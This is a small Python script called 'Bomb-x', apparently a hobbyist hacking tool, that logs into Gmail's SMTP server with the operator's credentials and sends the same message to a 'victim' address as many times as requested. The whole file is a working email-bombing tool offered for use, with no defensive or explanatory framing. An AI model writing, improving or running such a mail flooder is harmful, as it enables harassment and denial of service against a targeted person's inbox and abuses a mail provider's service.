import os
r="\033[1;31m"         # Red
g="\033[1;32m"       # Green
ye="\033[1;33m"      # Yellow
b="\033[1;34m"        # Blue
p="\033[1;35m"      # Purple
cy="\033[1;36m"        # Cyan
w="\033[1;37m"       # White

os.system("clear")
logo=ye+str("""
$$$$$$$\                          $$\                        
$$  __$$\                         $$ |                       
$$ |  $$ | $$$$$$\  $$$$$$\$$$$\  $$$$$$$\         $$\   $$\ 
$$$$$$$\ |$$  __$$\ $$  _$$  _$$\ $$  __$$\ $$$$$$\\$$\ $$  |
$$  __$$\ $$ /  $$ |$$ / $$ / $$ |$$ |  $$ |\______|\$$$$  / 
$$ |  $$ |$$ |  $$ |$$ | $$ | $$ |$$ |  $$ |        $$  $$<  
$$$$$$$  |\$$$$$$  |$$ | $$ | $$ |$$$$$$$  |       $$  /\$$\ 
\_______/  \______/ \__| \__| \__|\_______/        \__/  \__|
=================================================================
     ★★★[√] Devoloper : Mishkat Zaman★★★      
=================================================================
            Version : 2.1.1
""")
print(logo)
import smtplib
rocx=smtplib.SMTP('smtp.gmail.com','587')
rocx.ehlo()
rocx.starttls()
email=str(input(g+"[√] Enter Your Email : "+r))
pwd=str(input(b+"[√] Enter Your Password : "+cy))
rocx.login(email,pwd)
tmail=str(input(ye+"[√] Enter The Mail Address of Victim : "+w))
msg=str(input(g+"[√] Enter The Message : "+r))
amount=int(input(ye+"[√] Enter The Amount : "+w))
for i in range(amount):
	rocx.sendmail(email,tmail,msg)
	print(r+str(i+1)+" [√] ★★Bomb-x★★=>Mail sent ")